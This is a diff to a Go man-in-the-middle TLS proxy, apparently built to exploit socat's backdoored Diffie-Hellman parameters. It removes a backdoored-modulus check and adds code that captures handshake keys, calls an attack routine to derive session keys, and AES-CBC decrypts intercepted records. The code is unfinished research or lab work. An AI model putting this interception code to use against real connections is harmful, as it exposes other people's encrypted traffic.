@@ -9,6 +9,9 @@ import (
 	"fmt"
 	"io"
 	"os"
+
+	"crypto/aes"
+	"crypto/cipher"
 )
 
 // get client and server ip:port
@@ -17,6 +20,9 @@ var serverAddr *string = flag.String("r", "localhost:5443", "socat server addres
 
 // global vars
 var handshake_step int
+var client_encrypted = false
+var server_encrypted = false
+
 var clientRandom [32]byte
 var serverRandom [32]byte
 var modulus []byte 
@@ -24,37 +30,10 @@ var generator []byte
 var serverPubkey []byte
 var clientPubkey []byte
 
-// attack
-func attack() {
-	// everything is a global var
-}
-
-// backdoored modulus?
-
-func equality(a []byte, b []byte) (bool) {
-	// bytes
-	for index,_ := range a {
-		if a[index] != b[index] {
-			return false
-		}
-	}
-	//
-	return true
-}
-
-func backdoored(modulus []byte, generator []byte) (bool) {
-	dh1024_p := []byte{81, 103, 245, 255, 142, 93, 151, 165, 53, 36, 245, 103, 208, 126, 168, 12, 207, 110, 10, 205, 71, 23, 232, 73, 183, 70, 245, 216, 195, 149, 101, 181, 149, 112, 62, 61, 238, 8, 3, 151, 14, 95, 68, 144, 75, 16, 18, 33, 167, 82, 44, 92, 170, 122, 145, 42, 6, 92, 216, 174, 69, 172, 10, 75, 84, 129, 99, 65, 72, 38, 34, 37, 24, 106, 78, 179, 123, 11, 100, 106, 134, 224, 39, 157, 44, 167, 82, 162, 14, 48, 139, 27, 13, 96, 80, 7, 156, 239, 161, 170, 26, 119, 89, 87, 235, 47, 51, 152, 224, 40, 30, 59, 93, 180, 135, 70, 210, 7, 117, 1, 126, 214, 195, 36, 105, 119, 65, }
-
-	dh1024_g := []byte{48, 178, 71, 15, 134, 34, 126, 212, 37, 161, 132, 205, 184, 172, 127, 212, 63, 228, 176, 39, 2, 67, 182, 119, 24, 191, 60, 120, 130, 194, 178, 132, 45, 236, 173, 205, 91, 145, 22, 185, 152, 116, 31, 178, 217, 166, 71, 26, 113, 12, 134, 212, 178, 130, 61, 91, 116, 181, 110, 33, 182, 55, 150, 242, 71, 157, 71, 183, 137, 74, 192, 208, 157, 195, 131, 194, 42, 195, 82, 43, 35, 150, 237, 230, 202, 134, 82, 77, 16, 199, 9, 3, 253, 85, 66, 143, 6, 172, 162, 104, 22, 195, 214, 112, 158, 54, 251, 68, 196, 170, 133, 44, 178, 151, 255, 22, 202, 210, 88, 67, 222, 233, 74, 214, 121, 238, 196, }
-
-	if len(dh1024_p) == len(modulus) && len(dh1024_g) == len(generator) &&
-		equality(dh1024_p, modulus) && equality(dh1024_g, generator) {
-		log.Println("backdoor detected!")
-		return true
-	} else {
-		return false
-	}
-}
+var client_write_MAC_key []byte
+var server_write_MAC_key []byte
+var client_write_key []byte
+var server_write_key []byte
 
 // Parse the first TLS record, returns the en
 func parseTLSRecord(payload []byte) (int) {
@@ -75,6 +54,11 @@ func parseTLSRecord(payload []byte) (int) {
 		// serverRandom
 		copy(serverRandom[:], payload[6:32+6])
 		log.Println("serverRandom:", serverRandom)
+		// cipherSuite
+		/*
+		ciphersuite = binary.BigEndian.Uint16(payload[32+7:32+7+3])
+		log.Println("cipherSuite:", cipherSuite)
+*/
 
 	} else if payload[0] == 12 && handshake_step == 2 { // serverKeyExchange
 		log.Println("parsing serverKeyExchange")
@@ -117,7 +101,18 @@ func parseTLSRecord(payload []byte) (int) {
 		copy(clientPubkey, payload[6:6+pubkeyLength])
 		log.Println("clientPubkey:", clientPubkey)
 		// perform the attack
-		//successful <- attack() (this should be an event)
+		log.Println("starting the attack!")
+		client_write_MAC_key, server_write_MAC_key, client_write_key, server_write_key = attack(serverPubkey, clientPubkey, serverRandom[:], clientRandom[:]) // use of `go attack` ?
+/*
+  } else if payload[0] == 22 && handshake_step == 16 { // Encrypted Finished
+		log.Println("reached the encrypted finished")
+		// verify if the MAC_key is correct
+		if label == "server" {
+			
+		} else { // client
+
+		}
+*/
 	} else {
 		log.Println("parsing something else")
 	}
@@ -127,7 +122,7 @@ func parseTLSRecord(payload []byte) (int) {
 }
 
 // the forwarder/parser
-func forwardTLS(r io.Reader, w io.Writer) {
+func forwardTLS(r io.Reader, w io.Writer, label string) {
 	header := make([]byte, 5)
 
 	for {
@@ -149,8 +144,19 @@ func forwardTLS(r io.Reader, w io.Writer) {
 
 		if header[0] == 0x16 {
 			log.Println("tls:handshake")
+			// get version
+			/*
+			if version == nil {
+				version = binary.BigEndian.Uint16(payload[1:3])
+			}
+*/
 		} else if header[0] == 0x14 {
 			log.Println("tls:changeCipherSpec")
+			if label == "server" {
+				server_encrypted = true
+			} else {
+				client_encrypted = true
+			}
 		} else if header[0] == 0x17 {
 			log.Println("tls:application data")
 		} else if header[0] == 0x15 {
@@ -198,15 +204,50 @@ func forwardTLS(r io.Reader, w io.Writer) {
 
 		// parse the record it's a handshake
 		if header[0] == 0x16 {
-			offset := 0
-			for offset < len(payload) {
-				offset += parseTLSRecord(payload[offset:])
+			// are we encrypted? Probably finished
+			if (label == "server" && server_encrypted) || (label == "client" && client_encrypted) {
+				// attempt to decrypt the record and check which key is correct
+
+				var relevant_key []byte
+
+				if label == "server" {
+					relevant_key = server_write_key
+
+				} else {
+					relevant_key = client_write_key
+				}
+
+				block, _ := aes.NewCipher(relevant_key)
+				
+				iv := payload[:16]
+				ciphertext := payload[16:]
+
+				if len(ciphertext) % 16 != 0 {
+					log.Println("size of ciphertext is not a multiple of 128bits")
+				} else {
+					mode := cipher.NewCBCDecrypter(block, iv)
+					mode.CryptBlocks(ciphertext, ciphertext)
+					log.Println("decrypted")
+					fmt.Println("%s\n", ciphertext)
+				}
+				
+				// do we need to do that :X ?
+			} else { // clear handshake
+				offset := 0
+				for offset < len(payload) {
+					offset += parseTLSRecord(payload[offset:])
+				}
 			}
 		}
 
-		// try and decrypt right away?
-		if header[0] == 0x17 { //&& successful == True {
-			// create a routine? because if we are still calculating the key...
+		if header[0] == 0x17 { // decrypt if we can
+			log.Println("encrypted content")
+			if label == "server" && server_write_key != nil {
+				log.Println("we have the server_write_key, we should be able to decrypt")
+			} else if label == "client" && client_write_key != nil {
+				log.Println("we have the client_write_key, we should be able to decrypt")
+			}
+
 		}
 
 		// write everything
@@ -217,7 +258,7 @@ func forwardTLS(r io.Reader, w io.Writer) {
 	} // endfor
 }
 
-// forwaridng traffic
+// forwarding traffic
 func handleConnection(client net.Conn) {
 	log.Println("connection accepted")
 	// dial the ip
@@ -236,8 +277,8 @@ func handleConnection(client net.Conn) {
 	defer client.Close()
 	defer server.Close()
 
-	go forwardTLS(client, server)
-	forwardTLS(server, client)
+	go forwardTLS(client, server, "client")
+	forwardTLS(server, client, "server")
 }
 
 //
